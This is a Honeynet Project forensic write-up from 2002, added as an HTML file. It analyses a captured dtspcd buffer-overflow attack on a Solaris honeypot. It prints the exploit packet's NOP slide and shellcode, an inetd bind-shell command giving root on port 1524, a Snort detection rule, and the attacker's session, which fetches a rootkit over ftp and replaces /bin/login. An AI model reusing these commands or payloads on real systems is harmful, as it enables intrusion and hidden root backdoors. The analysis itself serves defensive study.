@@ -1,0 +1,273 @@
+<html><head>
+<title>Scan 20 by Solar Eclipse</title></head>
+<body>
+<center>
+
+<h3>
+Honeynet Project<br>
+Scan of the Month for April 2002<br>
+</h3>
+
+<i>By Solar Eclipse &lt;solareclipse at phreedom dot org&gt;</i>
+
+</center>
+
+<h4>The Challenge:</h4>
+On 08 January, 2002 a default, unpatched installation of Solaris8 Sparc was
+remotely compromised with the dtspcd exploit.  What makes this attack
+interesting is that this is the first time the attack was identified and
+captured in the wild, resulting a CERT advisory.<br>
+Using the Snort binary capture of the attack, answer the following questions.
+The honeypot that is attacked is 172.16.1.102.
+
+<h4>What is a NOP slide, and how is this one different from the NOP slide in
+the rpc.statd exploit in Scan10?</h4>
+
+<p>In most buffer overflow exploits, the attacker does not know the exact
+location of the shellcode. Even if the exact address of the shellcode can be
+determined by examining the binary of the vulnerable program, different
+versions of it might have different target locations. Recompiling or running
+the program in a different environment can also change the address of the
+shellcode. Since the difference in the location is often small, a NOP-slide
+technique can be utilized to make the exploit more reliable.</p>
+
+<p>A NOP-slide is a sequence of NOP (no operation) instructions strategically
+placed before the real shellcode. Depending on the size of the buffer the
+exploit is overwriting, there might be enough space for thousands of NOP
+instructions before the shellcode. When a return address is overwritten (or the
+execution of the vulnerable program is hijacked by other means), the jump
+location does not need to point to the first instruction of the shellcode. It
+can point to any of the NOP instructions in the buffer. The execution will
+"slide" down the NOPs and reach the shellcode. The advantage of this technique
+is that the attacker can guess the jump location with a low degree of accuracy
+and still successfully exploit the program.</p>
+
+<p>In x86 exploits the most commonly used NOP-slide uses opcode 0x90 (NOP).
+Long sequences of NOP instructions are easily detected by network intrusion
+detection systems like Snort. More sophisticated attackers would use a sequence
+of normal (non-NOP) instructions that don't interfere with the execution of the
+shellcode (like xor eax, eax).</p>
+
+<p>The instruction used for the NOP-slide in the Solaris/Sparc dtspcd exploit
+is xor %l1, %l1, %g0 (0x801c401 in the packet dump). This instruction has no
+effect on the program flow and can be executed many times before the execution
+reaches the real shell code.</p>
+
+<p>The following hex dump is a packet sent to the dtspcd service (tcp/6112) on
+the honeypot:</p>
+
+<pre>09:46:07.042661 adsl-61-1-160.dab.bellsouth.net.3595 &gt; 172.16.1.102.6112:
+P 1:1449(1448) ack 1 win 16060 <nop ,nop,timestamp="" 463986953="" 4159062=""> (DF)
+
+0000  00 e0 1e 60 70 40 08 00  20 f6 d3 58 08 00 45 00   .à.`p@..  öÓX..E.
+0010  05 dc a1 c1 40 00 30 06  24 07 d0 3d 01 a0 ac 10   .Ü¡Á@.0. $.Ð=. ¬.
+0020  01 66 0e 0b 17 e0 fe e0  8c 48 5f 82 f4 3e 80 18   .f...àþà .H_.ô&gt;..
+0030  3e bc 39 6b 00 00 01 01  08 0a 1b a7 e1 09 00 3f   &gt;¼9k.... ...§á..?
+0040  76 56 30 30 30 30 30 30  30 32 30 34 31 30 33 65   vV000000 0204103e
+0050  30 30 30 34 20 20 34 20  00 00 00 31 30 00 80 1c   0004  4  ...10...
+0060  40 11 80 1c 40 11 10 80  01 01 80 1c 40 11 80 1c   @...@... ....@...
+0070  40 11 80 1c 40 11 80 1c  40 11 80 1c 40 11 80 1c   @...@... @...@...
+0080  40 11 80 1c 40 11 80 1c  40 11 80 1c 40 11 80 1c   @...@... @...@...
+0090  40 11 80 1c 40 11 80 1c  40 11 80 1c 40 11 80 1c   @...@... @...@...
+                         --- CUT ---
+04c0  40 11 80 1c 40 11 80 1c  40 11 80 1c 40 11 80 1c   @...@... @...@...
+04d0  40 11 80 1c 40 11 80 1c  40 11 80 1c 40 11 80 1c   @...@... @...@...
+04e0  40 11 80 1c 40 11 80 1c  40 11 80 1c 40 11 80 1c   @...@... @...@...
+04f0  40 11 80 1c 40 11 80 1c  40 11 80 1c 40 11 20 bf   @...@... @...@. ¿ 
+0500  ff ff 20 bf ff ff 7f ff  ff ff 90 03 e0 34 92 23   ÿÿ ¿ÿÿ.ÿ ÿÿ..à4.#
+0510  e0 20 a2 02 20 0c a4 02  20 10 c0 2a 20 08 c0 2a   à ¢. .¤.  .À* .À*
+0520  20 0e d0 23 ff e0 e2 23  ff e4 e4 23 ff e8 c0 23    .Ð#ÿàâ# ÿää#ÿèÀ#
+0530  ff ec 82 10 20 0b 91 d0  20 08 2f 62 69 6e 2f 6b   ÿì.. ..Ð  ./bin/k
+0540  73 68 20 20 20 20 2d 63  20 20 65 63 68 6f 20 22   sh    -c   echo "
+0550  69 6e 67 72 65 73 6c 6f  63 6b 20 73 74 72 65 61   ingreslo ck strea
+0560  6d 20 74 63 70 20 6e 6f  77 61 69 74 20 72 6f 6f   m tcp no wait roo
+0570  74 20 2f 62 69 6e 2f 73  68 20 73 68 20 2d 69 22   t /bin/s h sh -i"
+0580  3e 2f 74 6d 70 2f 78 3b  2f 75 73 72 2f 73 62 69   &gt;/tmp/x; /usr/sbi
+0590  6e 2f 69 6e 65 74 64 20  2d 73 20 2f 74 6d 70 2f   n/inetd  -s /tmp/
+05a0  78 3b 73 6c 65 65 70 20  31 30 3b 2f 62 69 6e 2f   x;sleep  10;/bin/
+05b0  72 6d 20 2d 66 20 2f 74  6d 70 2f 78 20 41 41 41   rm -f /t mp/x AAA
+05c0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
+05d0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
+05e0  41 41 41 41 41 41 41 41  41 41                     AAAAAAAA AA
+</nop></pre>
+
+<p>As you can see, the buffer is filled with more than 250 xor %l1, %l1, %g0
+instructions. The attacker can point the return address anywhere within that
+range and successfully exploit the service.</p>
+
+<p>The only difference between this NOP-slide and the NOP-slide used in the
+rpc.statd exploit from scan10 is the target architecture. The rpc.statd exploit
+targets x86 and uses the 0x90 NOP instruction. The dtspcd exploit targets Sparc
+and uses the xor %l1, %l1, %g0 instruction. Because of the different
+instruction sets, the Sparc instruction is 4 bytes long and the x86 one is only
+1 byte.</p>
+
+<h4>The attack was on 08 Jan, 2002.  Would Snort have generated an alert then for the attack?</h4>
+
+<p>A properly configured Snort system would have generated a SHELLCODE sparc
+NOOP alert.  This rule has been in the snort rules (shellcode.rules and before
+that in overflow-lib) since 2000:</p>
+
+<pre>alert ip $EXTERNAL_NET any -&gt; $HOME_NET any (msg:"SHELLCODE sparc NOOP";
+content:"|801c 4011 801c 4011 801c 4011 801c 4011|"; reference:arachnids,353;
+classtype:attempted-user;)
+</pre>
+
+<p>While we are on the topic of IDS alerts, allow me to make a few
+observations. As many people have pointed out before, setting up an IDS is not
+sufficient for protecting a system from hackers. If this were the case,
+intrusion detection systems would be installed and running by default on all
+installations of RedHat or Debian. Unfortunately getting secure and staying
+secure requires a whole lot of work. A Snort alert is useless if you don't
+receive it (you should have all high priority alerts sent to you by SMS) or
+don't react immediately. If you wait till next morning it might be too late to
+save the corporate data. Very few organizations have good emergency response
+teams and procedures, or even the resources for it. Even when the system
+administrator is interested in security, his efforts are often limited by the
+company-wide attitude of "we don't care and even if we did, we wouldn't have
+the money for it". The most common security practice in 2002 is based on the
+incompetence of the average script kiddie - certainly not a viable long turn
+option. But enough ranting, let's get back to business.</p>
+
+<h4>In the exploit code, the command "/bin/sh sh -i" is given, what is its
+purpose, and why is 'sh' shown twice?</h4>
+
+<p>The exploit executes writes the line "ingreslock stream tcp nowait root
+/bin/sh sh -i" to /tmp/a and then executes /usr/sbin/inetd with /tmp/a as a
+configuration file. The format for the configuration file is described in the
+inetd.conf man page. The last two fields are &lt;server_path&gt; and
+&lt;args&gt;.</p>
+
+<p>When inetd receives a connection on port 1524 (ingreslock), it executes
+/bin/sh with parameters 'sh' and '-i'. The first parameter (argv[0] for the C
+programmers reading this) is the name of the program as it appears in ps, the
+second one is the 'run interactive' command line option. Without this option
+the hacker will have to separate her shell commands with a semicolon. With -i
+the shell works just like a normal shell.</p>
+
+<p>The attacker executed a variety of commands on the hacked Solaris box.
+Which commands were automated by the exploit, which commands were manual by the
+attacker himself?</p>
+
+<p>The first session on port 1524 (ingreslock) is definitely run by a script.
+The time between consecutive commands is rarely more than a few seconds. Each
+command is send as in packet, instead of sending it character by character as
+telnet would do. One of the packets even includes two commands separated by a
+newline - something very unusual for any command line tool. During the ftp
+login the username, password and all ftp commands are sent before the server
+gets a chance to respond with the username prompt.</p>
+
+There are two places where there are 20-30 seconds between two commands. It is
+possible that the attacker had a file with the commands to run and was
+pasting them into a netcat session, a few lines at a time.
+
+<p>The session follows:</p>
+
+<pre>uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/
+bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;echo "BD PID(s): "`ps
+ -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+# SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
+/core: No such file or directory
+/var/dt/tmp/DTSPCD.log: No such file or directory
+BD PID(s): 3476
+# w
+  8:47am  up 11:24,  0 users,  load average: 0.12, 0.04, 0.02
+User     tty           login@  idle   JCPU   PCPU  what
+# unset HISTFILE
+# cd /tmp
+mkdir /usr/lib
+# mkdir: Failed to make directory "/usr/lib"; File exists
+# mv /bin/login /usr/lib/libfl.k
+# ftp 64.224.118.115
+ftp
+ftp: ioctl(TIOCGETP): Invalid argument
+Password:a@
+
+cd pub
+binary
+get sun1
+bye
+Name (64.224.118.115:root): # 
+# ls
+ps_data
+sun1
+# chmod 555 sun1
+# mv sun1 /bin/login
+# 
+</pre>
+
+<p>After the commands in the ingreslock session are executed, the atacker
+connects to the honeypot with telnet, negotiates the telnet options and
+immediately disconnects. The purpose of this is to verify that the telnet
+server is running, without leaving too many traces in the system logs.</p>
+
+<p>It is very likely that this attack was executed by an automated script and
+the attacker was going to return to the machine later.</p>
+
+<h4>What is sun1, and how does it work?</h4>
+
+<p>sun1 is a part of a Solaris rootkit. The original /bin/login is copied to
+/usr/lib/libfl.k and replaces with sun1. The primary job of login is to
+authenticate users and handle logins, and as such it is a primary target of
+many rootkits.</p>
+
+<p>Unfortunately the snort capture was corrupted and reconstructing sun1 from
+the ftp session was impossible with both ethereal and tcpflow. The file was
+reported as truncated by objdump, gdb and IDA. But even without disassembling
+the file, it is easy to guess what it does.</p>
+
+<p>When the hacker telnets to the compromised machine, sun1 is invoked. If the
+hacker enters a magic username or password, sun1 executes /bin/sh and gives the
+attacker root access to the machine. If a user logs in with a normal username
+and password, sun1 forwards them to the real login program, which was stored in
+/usr/lib/libfl.k.</p>
+
+<p>The following strings found in sun1 confirm this analyzis:</p>
+
+<pre>/usr/lib/libfl.k
+pirc
+/bin/sh
+/bin/ksh
+login
+</pre>
+
+<h4>What did you learn from this exercise?</h4>
+
+<p>Black hats often get their hands on cool exploits before the rest of us.
+Ph34r!</p>
+
+<h4>How long did this challenge take you?</h4>
+
+<p>3 hours.</p>
+
+<h4>Bonus Question:<br>
+One of the commands executed during the attack is<br></h4>
+
+<code>echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`</code>
+
+<h4>What is the purpose of this command and what does 'BD' stand for?</h4>
+
+<p>Let's take it apart:</p>
+
+<p><code>echo "BD PID(s): "</code> prints "BD PID(s): "</p>
+
+<p><code>ps -fed</code> prints a full listing of all processes on the system, omiting
+session leaders</p>
+
+<p>The process listing is piped through grep, which prints only the lines
+that contain '-s /tmp/x'. This lists the copy(ies) of inetd that our
+exploit has started.</p>
+
+<p><code>grep -v grep</code> filters out the grep command from the list</p>
+
+<p>The awk script takes the second field out of the process listing
+(the process id) and prints it.</p>
+
+<p>The end result is something like this:<br>
+<code>BD PID(s): 4177 4182 31310</code></p>
+
+<p>I am not sure what BD stands for, but my guess is 'background' or 'bind
+daemon'. This command shows the attacker the process id of the inetd executing
+the session.</p>
+
+</body></html>
